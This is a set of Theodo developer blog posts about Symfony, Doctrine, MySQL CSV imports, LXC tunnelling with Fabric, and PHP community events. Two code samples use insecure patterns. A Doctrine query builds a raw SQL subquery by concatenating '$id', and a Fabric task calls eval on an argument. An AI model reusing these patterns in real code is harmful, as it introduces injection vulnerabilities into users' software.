SfLive gathered around 600 people this year. On the whole the organization was great, with only one minor issue: the secondary rooms were sometimes a bit too small for the audience. Which is, in a way, a consequence of the success of the event.
In his keynote, Fabien Potencier emphasized the importance of the community revolving around Symfony, and its continuous growth. Concerning Symfony2 news, the first Symfony2 certifications many had been waiting for were announced. Those hoping to hear the announcement of the 2.1 version of Symfony would have to wait some more though (but not too much: the beta version was officially released two weeks later!).
The conferences were globally of high quality, with some nice surprises, particularly in some very loosely Symfony2-related topics like John Clevely’s How we built the new responsive BBC News site, that I luckily attended because its schedule was exchanged with the previous conference. Very informative talk however about the answers they found to the multiplicity of devices connecting to the BBC site. Basically they chose to separate between two categories of users: those with low capacity devices, for whom the core elements will still be available, and the ones for whom an enhanced user experience is possible.
Talks ranged from specific technologies, either Symfony related or not too much (like Jeremy Mikola’s using MongoDB responsibly), to use cases like the BBC’s one or the wetter.de example that dealt with performance issues, cache and ESI, and a bit of good practices (David Zuelke’s Designing HTTP Interfaces and RESTful web services or why most self-called “REST API” are actually, well, just APIs).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Henri Cumenge
  			
  				  			
  		
    
			

									"
"
										The upcoming week will be really busy as two main conferences for the french PHP community will take place in Paris.
First the Forum PHP organized by AFUP from Tuesday to Wednesday at Cité universitaire. Going there you will meet many French PHP experts and among them Theodo which sponsors the event. As every year Fabrice and some members of the team will attend to the conferences over the two days. PHP, continuous integration, testing, Varnish, Postgres, MySQL, and many other topics will be raised during the two days.
Right after the Forum PHP, the Symfony Live will follow in the same place. And again Theodo sponsors the event and you may meet us there. Like previous editions this one looks promising, especially since so much is going on around Symfony lately.
A huge program for PHP developers this week, but it is not finished. Marek and I will present the RogerCMS bundle at La Netscouade on Tuesday 12th. This conference is organised by AFSY and there are not many places available so be sure to register before. And if you cannot come, you can still come drink beer with us at Patrick’s Pub.
Hope to see you there !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										We often have to face the problem of importing data off an Excel file with thousands lines.
PHP is not suited for this task, it’s slow and there is a high risk for the import to crash due to “memory limit” or some other annoying stuff like that!
So instead we chose a better way by using pure SQL which is much faster at this kind of operation.
At first, you must convert your Excel file to CSV (Excel does it very well). Be careful to choose the right field separator: I generally use “~” because there is little chance of finding this character in your written data.
Steps:

Create a temporary table that matches exactly the structure of the Excel file
Fill the temporary table with the CSV file
Run SQL queries to fill your database

Practical example:
Suppose we have an Excel file containing thousands of users that must be dispatched to several tables depending on their type.
CSV file sample:
        User 1~user1@theodo.fr~0987564321~user~~~
        User 2~user2@theodo.fr~0134256789~user~~~
        User 3~user3@theodo.fr~0128971271~user~~~
        Agent 1~agent1@company.com~0486282688~agent~Company 1~Role 1~0987654321
        Agent 2~agent2@company.com~0176254621~agent~Company 2~Role 2~0445664332
        User 4~user4@company.com~0456789856~user~~~
1. Create the temporary table
We will create a table contain the following fields:

name
email
phone
type
company_name
agent_role
company_phone

DROP TABLE IF EXISTS user_tmp;
CREATE TABLE user_tmp (
        name	 varchar(127),
        email varchar(127),
        phone varchar(20),
        type varchar(20),
        company_name	varchar(127),
        agent_role varchar(127),
        company_phone varchar(20),
        id int(11) NOT NULL auto_increment,
        PRIMARY KEY (`id`),
        UNIQUE KEY `IDX_ATTRIBUTE_VALUE` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
2. Fill the temporary table
Import your CSV file into the temporary table:
    LOAD DATA LOCAL INFILE 'PATH_TO_YOUR_CSV_FILE/users.csv'
        INTO TABLE user_tmp CHARACTER SET 'utf8' FIELDS TERMINATED BY '~' LINES TERMINATED BY '\n';
3. Fill your own tables
Suppose you have the following two tables:
User

name
phone
email

Agent

name
phone
email
company_name
role
company_phone

Insert data with SQL queries:
INSERT INTO user (name, phone, email)
    SELECT name, phone, email FROM user_tmp WHERE type = 'user';
INSERT INTO agent (name, phone, email, company_name, role, company_phone)
    SELECT name, phone, email, company_name, agent_role, company_phone FROM user_tmp WHERE type = 'agent';
All done! Your tables are complete.
This is a simple example, you can use this method to make more complex data imports (with joins). All you need to do is to adapt your SQL queries.
Here we have seen how we can leverage something fast but apparently limited (LOAD DATA) and make it powerful, by using a temporary table and SQL requests inserting data into the actual tables.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										
Symfony2 has been around for quite a while. Personally, I love how much PHP-oriented it is. It feels much closer to the language base than the first version of the framework. It means less of the magic and more of the important decisions in the hands of the development team. But there is no real framework without some magic, which is sometimes really hard to master.
Enough of the introduction, it is time for the technical stuff. First, let us take a look at some user cases:

As the bundle base grows, we see or might see soon a lot of bundles which would make heavy use of the database – blogs, forums, eCommerce… Let’s say we want to integrate such a bundle with our EnormousWebsiteBundle. Easy, isn’t it? But wait! We did not think of prefixing our table names (who does?), and neither did the author of the bundle. And all of a sudden we have conflicts everywhere.
We have some databases that already exist. And the client wants us to make an application that uses all of them.
We want to backup different sets of data at different frequencies.
We need to optimize our application, using different data storage solutions: a SQL database, a NoSQL database, etc.

In all those cases one of the solutions (or a necessity) is to use multiple databases. So let us do some Symfony2 magic!
It begins in config.yml
Lets say we have a simple blog bundle, which we want to adapt to use its own database. The easy part is configuring the connection:
doctrine:
    dbal:
        connections:
            ...
            blog:
                driver:   %blog.database_driver%
                host:     %blog.database_host%
                dbname:   %blog.database_name%
                user:     %blog.database_user%
                password: %blog.database_password%
                charset:  UTF8
Next, create a second entity manager:
doctrine:
    orm:
        entity_managers:
            ...
            blog:
                connection:   blog
                mappings:
                    MyAwesomeBlogBundle: ~
Well, we can say that your bundle is configured.
Try to use your second database
It is easy to find in the official documentation that you can simply do
$this->get('doctrine')->getEntityManager($name)
to use your custom entity manager. But I guess you never actually had to do it, being happy with the default one. So this will require some refactoring. The simplest solution is to specify a parameter in your config, let’s say:
parameters:
    my_awesome_blog.entity_manager.name: blog
If you’re going to publish your bundle, set it to ‘default’, in case somebody wouldn’t want to use a separate EM, and you should be safe. Now, you need to pass the parameter to each (well, most of) getEntityManager calls in your bundle. It will be a bit of work, depending on the was you used that function. Let’s hope you defined some services, like this one:
my_awesome_blog.content_repository:
    class: %my_awesome_blog.content_repository.class%
    arguments: ['@doctrine.orm.entity_manager']
or some functions like
$this->getEntityManager()
in your controllers. Don’t worry about the extra work, at least it will help you to decouple your code even more (and we like loosely coupled code, don’t we?).
Is it all?
It depends. These are the basics. Things are getting tricky when:
You need to login with an entity which is not in the default entity manager
You will need to overwrite the user provider, and pass your custom entity manager to it. In the simplest form it will be something like that:
# security.yml
security:
    providers:
        blog_user:
            id: my_awesome_blog.user_provider #this is the name of your service
Now you need to register a simple service which will use your custom entityManager:
# services.yml
parameters:
    my_awesome_blog.user_provider.class: Symfony\Bridge\Doctrine\Security\User\EntityUserProvider
    my_awesome_blog.user_provider.user.class: MyCompany\MyAwesomeBlogBundle\Entity\User
    my_awesome_blog.user_provider.user.parameter: username

services:
    my_awesome_blog.user_provider:
        class: %my_awesome_blog.user_provider.class%
        arguments:
            - '@doctrine.orm.blog_entity_manager'
            - %my_awesome_blog.user_provider.user.class%
            - %my_awesome_blog.user_provider.user.parameter%
This one will allow you to use a standard “form_login” configuration, as long as you pass the provider to your firewall (see security reference if you’re not familiar with the config options: http://symfony.com/doc/2.0/reference/configuration/security.html).
You have some forms that use your entities
This one is a little tricky. By default most of internal functions use
$container->get('doctrine')->getEntityManager()
which just doesn’t work with multiple EM’s. You’ll get errors saying you Entity is not an Entity (feels like JavaScript!). Don’t worry it is an Entity, just not registered in that manager. I’ve recently made a pull request about this issue (here), and it got into symfony:master, but if you still use 2.0 you have to take the matters in your own hands [update: The PR is merged in Symfony 2.1]. So far I’ve found one class that needs to be changed (see the pull request). Simply change the few mentioned lines of code, save it in your bundle and add this to your services’ parameters:
doctrine.orm.validator.unique.class:
    MyCompany\MyAwesomeBlogBundle\Validator\Constraints\BlogUniqueEntityValidator
Well, if you ever find anything else, and you don’t feel like defining your very own service, just try to use the awesome getEntityManagerForClass() function and overload some default classes.
Good luck!
Defining your own entity manager seems easy. This part of Symfony2 configuration is awesome. It is easy, as long as you’re not trying to force it to do some more complicated stuff. After a certain point, you find a bunch of default services, which you need to redefine/overload/give up on using at all. Well, whether you really need to do this, or just want to see how it would be like… I wish you best of luck, and don’t forget to share your experience!



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										
Today I will explain how to test your entities in a Symfony2 and Doctrine2 project.

To achieve our work, we will work on a location model which will look somewhat like this:


Location:
- address: string, required
- zip code: string, required
- city: string, required
- country: string, required

Test Driven Development
In the test driven development (TDD) world, a best practice is to start writing your test case before writing any code. So we will write our test case in the Tests/Entity folder of our bundle:

/**
 * Location class test
 *
 * @author Benjamin Grandfond 
 * @since 2011-07-16
 */
namespace ParisStreetPingPong\Bundle\PsppBundle\Entity;

class LocationTest extends \PHPUnit_Framework_TestCase
{
    protected $location;

    public function setUp()
    {
        parent::setUp();

        $this->location = new Location();
    }

    public function testGetAddress()
    {
        $address = '80 Rue Curial';

        $this->location->setAddress($address);

        $this->assertEquals($address, $this->location->getAddress());
    }
}
Note that the aim of this blog post is not to write a test case that covers 100% of the code, but show how to to write a database test case easily.
Once your test is written, if you run it it should not pass; don’t worry, we will write the code to make it work 😉 Instead of manually creating a file as you would usually do, you can use PHPUnit! It handles the creation of classes from the test case:
$ phpunit --skeleton-class src/Theodo/Bundle/MyBundle/Tests/Entity/LocationTest.php

This will generate your Location.php class in the same folder as the LocationTest.php file, you only need to move it to the Entity folder of your bundle. The tree of your application should look like:


src/Theodo/Bundle/MyBundle
|-- Entity
|  |-- Location.php
|-- Tests
|  |-- Entity
|  |  |-- LocationTest.php

And your Location.php should already contains some code :



So now, you only need to add properties with Doctrine annotations! I recommended against using the YAML or XML formats to describe your model because, when you will generate your getters and setters, Doctrine will append properties and methods to the existing source, so you will have to copy/paste a lot to clean up the code…

Finally, your class should look like this:
namespace Theodo\Bundle\MyBundle\Entity;

use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Entity
 * @ORM\Table(name=""location"")
 */
class Location
{
    /**
     * @ORM\Id
     * @ORM\Column(type=""integer"")
     * @ORM\GeneratedValue(strategy=""AUTO"")
     */
    protected $id;

    /**
     * @ORM\Column(type=""string"")
     */
    protected $address;

    /**
     * @ORM\Column(type=""string"", length=""7"", name=""zip_code"")
     */
    protected $zipCode;

    /**
     * @ORM\Column(type=""string"")
     */
    protected $city;

    /**
     * @ORM\Column(type=""string"")
     */
    protected $country;

    /**
     * Set $address
     *
     * @param string $address
     */
    public function setAddress($address)
    {
        $this->address = $address;
    }
 
    /**
     * Get $address
     *
     * @return String
     */
    public function getAddress()
    {

        return $this->address;
    }
}
Actually, this sample does not prove the real utility of the skeleton class generation with PHPUnit because the class could have been generated with Doctrine generate entities command, but you can use it with a class which does not deal with Doctrine.
If you launch your test now it should pass, but we didn’t do anything that needs the database. So I will add a $localization property to the Location class which will contain the full address.

// MyBundle\Entity\Location

/**
 * @ORM\Entity
 */
class Location
{
 ...
/**
 * @ORM\Column(type=""text"", nullable=""true"")
 */
protected $localization;

...
}
Now we will complete our Location test, and after we will implement the generateLocalization() which should be called on the prePersist event.
Configuration
The first thing you must do when you run a test that use database insertion with Symfony2 and Doctrine2, is to set up the database connection. To do so, you have configure the doctrine DBAL handling the connection in the config_test.yml file:
imports:
    - { resource: config_dev.yml }

framework:
    test: ~
    session:
        storage_id: session.storage.filesystem

web_profiler:
    toolbar: false
    intercept_redirects: false

swiftmailer:
    disable_delivery: true

doctrine:
    dbal:
        driver:       sqlite
        host:         localhost
        dbname:    db_test
        user:         db_user
        password: db_pwd
        charset:     UTF8
        memory:    true
So, to run our tests, we will use SQLite in memory. While you are free to use something else, it will not be as efficient and easy to setup. Also you won’t need to use transactions to revert the data as they were before the test, you can delete anything and recreate it very quickly.
PHPUnit test case
Now that the configuration is done, you will use the kernel of your Symfony2 application which will load this configuration,  Doctrine and the full application. We will do this in another class that must be abstract to not being considered as a test case by PHPUnit. It will also allow us to use it anytime we need to test something with databases interactions.
/**
 * TestCase is the base test case for the bundle test suite.
 *
 * @author Benjamin Grandfond
 * @since  2011-07-29
 */

namespace ParisStreetPingPong\PsppBundle\Tests;

require_once dirname(__DIR__).'/../../../../app/AppKernel.php';

use Doctrine\ORM\Tools\SchemaTool;

abstract class TestCase extends \PHPUnit_Framework_TestCase
{
    /**
     * @var Symfony\Component\HttpKernel\AppKernel
     */
    protected $kernel;

    /**
     * @var Doctrine\ORM\EntityManager
     */
    protected $entityManager;

    /**
     * @var Symfony\Component\DependencyInjection\Container
     */
    protected $container;

    public function setUp()
    {
        // Boot the AppKernel in the test environment and with the debug.
        $this->kernel = new \AppKernel('test', true);
        $this->kernel->boot();

        // Store the container and the entity manager in test case properties
        $this->container = $this->kernel->getContainer();
        $this->entityManager = $this->container->get('doctrine')->getEntityManager();

        // Build the schema for sqlite
        $this->generateSchema();

        parent::setUp();
    }

    public function tearDown()
    {
        // Shutdown the kernel.
        $this->kernel->shutdown();

        parent::tearDown();
    }

    protected function generateSchema()
    {
        // Get the metadata of the application to create the schema.
        $metadata = $this->getMetadata();

        if ( ! empty($metadata)) {
            // Create SchemaTool
            $tool = new SchemaTool($this->entityManager);
            $tool->createSchema($metadata);
        } else {
            throw new Doctrine\DBAL\Schema\SchemaException('No Metadata Classes to process.');
        }
    }

    /**
     * Overwrite this method to get specific metadata.
     *
     * @return Array
     */
    protected function getMetadata()
    {
        return $this->entityManager->getMetadataFactory()->getAllMetadata();
    }
}
Complete the test

/**
 * Location class test
 *
 * @author Benjamin Grandfond 
 * @since 2011-07-16
 */
namespace ParisStreetPingPong\Bundle\PsppBundle\Entity;

use ParisStreetPingPong\PsppBundle\Tests\TestCase;

require_once dirname(__DIR__).'/TestCase.php';

class LocationTest extends TestCase
{
    ...
    public function testGenerateLocalization()
    {
        $this->location->setAddress('14 Rue Notre-Dame-des-Victoires');
        $this->location->setZipCode('75002');
        $this->location->setCity('Paris');
        $this->location->setCountry('FR');

        // Save the location 
        $this->entityManager->persist($this->location);
        $this->entityManager->flush();

        $this->assertEquals('14 Rue Notre-Dame-des-Victoires 75002 Paris FR', $this->location->getLocalization());
    }
}
generateLocalization implementation
And now we only need to complete our Location entity and launch again our test that must pass 

// MyBundle\Entity\Location

/**
 * @ORM\Entity @ORM\HasLifecycleCallbacks
 */
class Location
{
 ...

    /** @ORM\PrePersist */
    public function generateLocalization()
    {
        $localization = $this->getAddress().' ';
        $localization .= $this->getZipCode().' ';
        $localization .= $this->getCity().' ';
        $localization .= $this->getCountry();

        $this->setLocalization($localization);
    }
}



#content #because-we-need-to-redo-the-blog
{
  line-height: 20px;
}
#content #because-we-need-to-redo-the-blog .with-separator
{
  margin-top: 50px;
}
#content #because-we-need-to-redo-the-blog h4
{
  margin-top: 25px;
}
#content #because-we-need-to-redo-the-blog h4,
#content #because-we-need-to-redo-the-blog p,
#content #because-we-need-to-redo-the-blog pre,
#content #because-we-need-to-redo-the-blog ul
{
  margin-bottom: 15px;
}
#content #because-we-need-to-redo-the-blog li
{
  margin-bottom: 10px;
}


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										With the intent of testing our projects in separate environments, I have been working recently on simple fabric scripts for automating LXC containers creation; a basic one can be found at https://github.com/raphaelpierquin/fabulxc, however the context was slightly more complicated here, since we intended to create those on our remote test server and not locally. A more thorough (and specific) installation was also required, with database creation, automated symfony projects installation and server deployment.
In the following tutorial, I adopted a “get things done” mindset. There are many nice-to-haves that will be implemented in the future, such as defining the containers’ ips by DHCP and not statically.
For the most part, the LXC creation is pretty straightforward and requires basically the replacement of the
local
calls by
run
calls in fabulxc.
The root directory of container cont_name is accessible under
/var/lib/lxc/cont_name/rootfs/,
which allows for adding or modifying files. For instance adding your public key for authentication is pretty easy since we can copy it directly from the remote server at
/var/lib/lxc/cont_name/rootfs/root/.ssh/authorized_keys :
that can be done even before starting the lxc container.
The first real issue is to be able to work inside the containers: in order to install packages or launch a service however, we want our script to be able to access the container itself. Working inside the container, itself in a remote server, is going to require tunneling through the server.
Tunneling seems sadly not to be fully supported by fabric (cf open issue https://github.com/fabric/fabric/issues/38, apparently there are some issues related to paramiko), so after having a quick look at the existing options I could find (https://gist.github.com/e3e96664765748151c05 and https://gist.github.com/e3e96664765748151c05), I chose to go the simple way*, i.e. do it myself by hand :
def open_tunnel(ip):
print 'Opening tunnel'
process = subprocess.Popen(['ssh', '-N', '-L1248:' + ip + ':22', 'root@example.theodo.fr']);
sleep(2)
return process

def close_tunnel(process):
print 'Closing tunnel'
process.terminate()

#Calls a function inside a tunnel
@task
@hosts('root@127.0.0.1:1248')
def tunnel_wrap(function_name, name):
#finds the (static) ip of the container
with settings(host_string = 'root@example.theodo.fr:22'):
ip = get_container_ip(name)
function = eval(function_name)
p = open_tunnel(ip)
with settings(warn_only=True):
function(name)
close_tunnel(p)

Say we want to install our packages and have defined an

install_packages
function, we only need to call
tunnel_wrap (‘install_packages’, cont_name)
to install the packages for the container “cont_name”.
Basically, we just open a tunnel on port 1248 to the desired container, execute our function, then close the tunnel.
The
warn_only=True
environment setting allows the closing of the tunnel even when the executed function sends back an error (since fabric stops by default at the first failure).
*This is obviously only a workaround, but it serves our purpose quite well. I intend to be testing the solutions cited before soon, though, hopefully there will be a post about that later :).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Henri Cumenge
  			
  				  			
  		
    
			

									"
"
										Version française plus bas
Save the date! Theodo will be present at the Open World Forum, as I have been selected to talk about “Adpoting devops philosophy” on Friday Sept. 23 at 16:30.
More info about the conference here: http://www.openworldforum.org/Conferences/Adopter-la-philosophie-DevOps
I am very happy to be able to spread the good word in such an important conference! The main purpose will be to explain how devops extends agility and its concepts to the whole lifecycle of an IT project, including deployment and system administration and how this can improve the productivity and responsiveness of your IT organization.
See you there!
—
Réservez votre vendredi 23 septembre ! Theodo sera présent à l’Open World Forum, j’ai en effet été sélectionné pour intervenir comme conférencier sur “Comment adopter la philosophie devops” ce vendredi 23/9 à 16:30.
Plus d’informations sur la conférence ici: http://www.openworldforum.org/Conferences/Adopter-la-philosophie-DevOps
Je suis très content de pouvoir répandre la bonne parole devant un nouveau public. Mon objectif sera d’expliquer comment la philosophie devops étend les concepts d’agilité à tout le cycle de vie d’un projet informatique, déploiement et maintenance incluse et comment ces concepts peuvent augmenter la productivité et la réactivité de votre organisation informatique.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										Just after two major PHP events (Forum PHP and sfLive in Paris) we met once again during AFSY‘s monthly sfPot. Last Tuesday (June 12) it was @LaNetscouade that invited us to their offices.
This time Theodo prepared the presentation. We – Benjamin Grandfond and me – introduced the participants to TheodoRogerCmsBundle. The bundle helps you to incorporate basic CMS features into your project, integrating easily with existing applications and letting you keep control of what content the user can modify. See https://speakerdeck.com/u/benjam1/p/theodorogercmsbundle for slides.
After the talk and a bit of discussion concerning the project, we went to Saint Patricks pub and spent the evening discussing the last news in Symfony community and some less formal topics.
Stay tuned for the next sfPot event.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										 
We are happy and proud to announce the victory of LaFourchette.com mobile website in the “M site” contest!
http://www.lemsitedelannee.fr/Gagnants.aspx (FR)
The application has been designed by LaFourchette and developed by Theodo.
What is LaFourchette.com?
The purpose of LaFourchette.com are to offer to its users a fast way to discover restaurants near a specified localization, and book a table from the application. The service — thanks to partnerships with restaurants —, also provides special offers, like a free drink or a discount.
What is the “M site” contest?
This is a competition between several mobile websites of French companies. The contest is organized by Google, Les Echos (a French daily newspaper) and MMAF, for Mobile Marketing Association France.
The jury is composed of the MMAF president, the Virgin Mobile CEO and the Echos chief editor.
During a month, the applications were judged on several criteria, as ease and speed of browsing, use of geolocation, accessibility on different kind of mobile devices and adaptation to touch technologies.
Theodo’s contribution
LaFourchette.com realized that a significant amount of people was browsing on the main website from their mobile phones, even though Android and iPhone apps were both available. So, they decided to design a mobile website, and asked Theodo to develop it.
The project has been divided in three steps, and developed in almost three months by Pierre-Henri Cumenge as Lead Developer, and me — Rémy Luciani. Julien Laure was Product Manager on this work. The three of us worked in an agile way, with stand-up meetings every morning, and — of course —, with Theodo Spot, our project management tool, in order to place LaFourchette requirements at the center of the development.
Furthermore, the application has been developed with Symfony2 and Twig. It was pleasant to develop this app, and proves that Symfony2 does the job well also for mobile websites!

Finally, Theodo would like to thank LaFourchette.com for this experience and their nice design of the mobile site. Congratulations!

More infos on Les Echos : http://blogs.lesechos.fr/techosphere/le-prix-du-m-site-de-l-annee-decerne-a-la-fourchette-a11198.html

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Remy Luciani
  			
  				Theodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. 

""The Prod is life!""  			
  		
    
			

									"
"
										This Thursday 12/07, the French Association of Php Users (AFUP) holds a meeting in Paris, sponsored by Theodo.
Julien Pauli (Software Architect & Lead Developper at Comuto) and Hugo Hamon (Trainings Manager & Symfony2 Developer at Sensio Labs), will discuss design-patterns and anti-patterns in PHP.  Moreover, Fabrice Bernhard will finish the conference by speaking about his own experience with design patterns. No spoiler here. ;-]
After the presentations, we will  have a drink and eat some snacks all together.
You can read more infos and should subscribe here: http://www.afup.org/pages/rendezvous/index.php.
We hope to see you tonight!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Remy Luciani
  			
  				Theodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. 

""The Prod is life!""  			
  		
    
			

									"
"
										
Sometimes you just need to output the number of objects related to another, but this simple operation can be a major blow performance-wise. I hope this trick I use a lot in my symfony + doctrine developments will save you some time.
Let’s consider a blog that allows you to tag your posts:
BlogPost:
  columns:
    title: string(255)
    body: clob
  relations:
    Tags:
      class: Tag
      foreignAlias: BlogPosts
      refClass: BlogPostTag
      local: blog_post_id
      foreign: tag_id

Tag:
  columns:
    name: string(255)

BlogPostTag:
  columns:
    blog_post_id:
      type: integer
      primary: true
    tag_id:
      type: integer
      primary: true
  relations:
    BlogPost:
      local: blog_post_id
      foreign: id
      foreignAlias: BlogPostTags
    Tag:
      local: tag_id
      foreign: id
      foreignAlias: BlogPostTags
You can retrieve this schema in the symfony 1.x documentation
Now, we build an admin generator which shows the number of tags per blog post on the list, with 20 results per page. This means we will have 1 SQL request to retrieve the 20 posts and 1 SQL request per post to retrieve the tag count. Taking into account the count request of the pager, we will have a total of 22 requests. This will get worse if we choose to display more blog posts at a time.
There is a way to optimize this with Doctrine!
Add count into the query
Let’s add the calculation of the tag count to the request that retrieves the blog posts.
It could look like that:
  // lib/model/doctrine/BlogPostTable.class.php
  /**
   * Find a blog post by its id.
   * @param integer $id
   * @return BlogPost|false
   */
  public function findById($id)
  {
    // Subquery that counts the number of tags per post.
    $sub_query = '(SELECT COUNT(t.id) FROM BlogPostTag t WHERE blog_post_id = '.$id.')';

    $query = $this->createQuery('bp')
      ->select('bp.*')
      ->addSelect($sub_query.' as nb_tags') // the number of tags will be in the nb_tags variable
      ->where('bp.id = ?', $id);

    return $query->execute();
  }
Explanations

The $subquery counts the number of tags for the blog post in SQL (more about Doctrine 1.2 subqueries).
Create a query that retrieves blog post by its id
Add the $subquery into the select with an alias ‘nb_tags’. You have to specify what you want to select first to use the addSelect method, otherwise it will not work.
Return the execution of the query

Result
The result of the query should be an instance of a Doctrine_Record (false if no blog post is found) which contains the result of the subquery into its protected array $_values. As it is a protected attribute of the Doctrine_Record class it can be accessed in your BlogPost model class.
Create a smart getter
So now that we get the value of ‘nb_tags’ into the hydrated record we can write a getter that returns this value in a smart way.
First of all, you should add an attribute to your model class to store the number of tags:>
  // lib/model/doctrine/BlogPost.class.php

  /**
   * The number of tags of the blog post.
   * @var Integer
   */
  protected $nb_tags = null;
Then, implement the getNbTags() that will return the value of the ‘nb_tags’ key in the $_values array of the doctrine record. But what if the record has been found by using another query? The ‘nb_tags’ will not exist so you have to test it otherwise you might face an exception. This is how you should write your getter:
  // lib/model/doctrine/BlogPost.class.php

  /**
   * Return the number of tags related to the blog post.
   *
   * @return Integer
   */
  public function getNbTags()
  {
    // The number of tags is not yet set
    if (is_null($this->nb_tags)
    {
      // the variable added in the SQL request will be found in the $_values of the doctrine record
      if (isset($this->_values['nb_tags']))
      {
        $this->nb_tags = $this->_values['nb_tags'];
      }
      else
      {
        /**
         * The number of tags has not been set in the SQL request
         * Doctrine will lazy load every tag and count them all.
         * This could be optimized by overwriting the createQuery method,
         * adding a left join to the tag table automatically in BlogPostTable.class.php
         * (beware, it can lead to unwanted side effects)
         */
        $this->nb_tags = $this->getTags()->count();
      }
    }

    return $this->nb_tags;
  }
Conclusion
So what have we achieved? Simple: we reduced the number of SQL requests in our admin gen from 22 to 2! One to retrieve the blog posts with the number of related tags, and the other by the Doctrine pager. Obviously, this trick isn’t restricted to admin generators, so think of the many situations where you can use it!


#content #because-we-need-to-redo-the-blog
{
  line-height: 20px;
}
#content #because-we-need-to-redo-the-blog .with-separator
{
  margin-top: 50px;
}
#content #because-we-need-to-redo-the-blog h4
{
  margin-top: 25px;
}
#content #because-we-need-to-redo-the-blog h4,
#content #because-we-need-to-redo-the-blog p,
#content #because-we-need-to-redo-the-blog pre,
#content #because-we-need-to-redo-the-blog ul
{
  margin-bottom: 15px;
}
#content #because-we-need-to-redo-the-blog li
{
  margin-bottom: 10px;
}


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										A project is never finished, and at Theodo we often have to quickly alter a project, in a small way. The issue is that the time required to having the project ready on a developer’s machine can be greater that the time required to do the the rest! But worse, setting up a project is boring.
This is why we decided to automate as much as possible the low added-value aspects of setting up a project.
There are usually four aspects to setting up a project:

Dependencies
Configuration files
A database
A web server, configured for the website, including the URL rewriting

Dependencies
In our case, it usually means only “Symfony, version 1.x”. For Python projects, a pip dependencies file is provided, and running a script will create a virtualenv and install the dependencies: no root access or hunting on the web is needed.
For Symfony projects, it’s easy to have all major versions at hand. However, these projects usually require multiple symbolic links to be created, in non-standardized places. Thankfully, we chose to adopt convention over configuration and only one line of configuration is actually needed for mksymlinks to do its magic.
If you chose to install Symfony other than in lib/vendor (likely with versions under 1.2), you can of course configure mksymlinks to handle it.
Configuration
The configuration of a project on the production servers and on the developer’s machines usually differ; database passwords, mail and database servers location, etc. The configuration files are therefore not versioned, only sample versions of them are, designed for a standard development environment.
A simple script can find the “sample” configuration files and create symbolic links (ideal for developers) or copies of these sample files. The developer shouldn’t need to alter these files to setup the project.
Running the script will for instance create a symlink from config/databases.yml to config/databases.sample.yml.
Databases
While recent versions of Symfony and Doctrine can create a database, older versions and Propel can’t. Also, database users and their credentials still have to be created, and it is really annoying to set them up. We use a simple script which will write a SQL script, and will try to run it using the credentials of ~/.my.cnf.
An alternative is to use SQLite, but it can quickly become a limitation for bigger projects.
The database is then filled with meaningful and useful fixtures.
The web server
Last but not least, the web server. Frameworks like Ruby on Rails or Django come with their own servers. These are not for production use, but are perfect for developer’s needs: no root access required, instant startup, no configuration… In the PHP world, nothing similar to be found. However, it is very well possible to configure and start a small server automatically.
That’s the job of symfttpd and its command spawn: run it and it will configure and start a lighttpd-based server, then tell you where you can view the project, and what applications are present.
The scripts handling the sample configuration and database are rather crude and around 50 lines of code; you should be able to write your own in no time if you are too impatient for a proper release of our own.
Let’s not forget documentation
While all of this works great, nothing replaces an INSTALL file with all the necessary steps, especially the unusual ones. It’s also nice to provide scripts to run all the required commands in one go; run it and your project is ready! (There’s still time to get a nice cup of coffee especially with our new awesome coffee machine.)
There is more to come
On the same principles, we use some of the tools mentioned above in our continuous integration platform, to be able to add any project in no time.
